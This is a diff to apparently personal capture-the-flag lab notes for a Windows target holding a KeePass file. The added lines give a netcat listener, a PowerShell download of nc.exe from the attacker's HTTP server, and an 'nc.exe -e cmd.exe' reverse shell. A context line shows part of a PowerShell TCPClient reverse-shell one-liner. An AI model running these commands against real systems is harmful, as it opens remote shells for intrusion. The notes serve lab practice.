@@ -11,7 +11,7 @@
 ##### **Conclusion**
 **Time :** 
 	**Start :** 22.04.2025 16:31
-	**Break at/to :** 22.04.2025 19:02
+	**Break at/to :** 22.04.2025 19:02 | 23.04.2025 17:00
 	**Finish :** 
 **Satisfaction :**  
 ### 1. **Reconnaissance
@@ -80,6 +80,27 @@ powershell -nop -c "& { $client = New-Object Net.Sockets.TCPClient('10.10.14.117
 The server is extremely slow but it's okkey
 
 ![[Pasted image 20250422172207.png]]
+
+After 1h30 without extracting the CEH.kdbx file I found that I have to make some changes.
+
+First
+
+```BASH
+nc -nvlp 1234
+```
+
+After
+
+Download nc.exe on my machine and place me in the directory and start a http python server.
+
+End
+
+```POWERSEHLL
+powershell wget "http://10.10.14.117:8000/nc.exe" -outfile "nc.exe"
+nc.exe -e cmd.exe 10.10.14.117 1234
+```
+
+And it's good.
 
 ## 5. **Installation
 
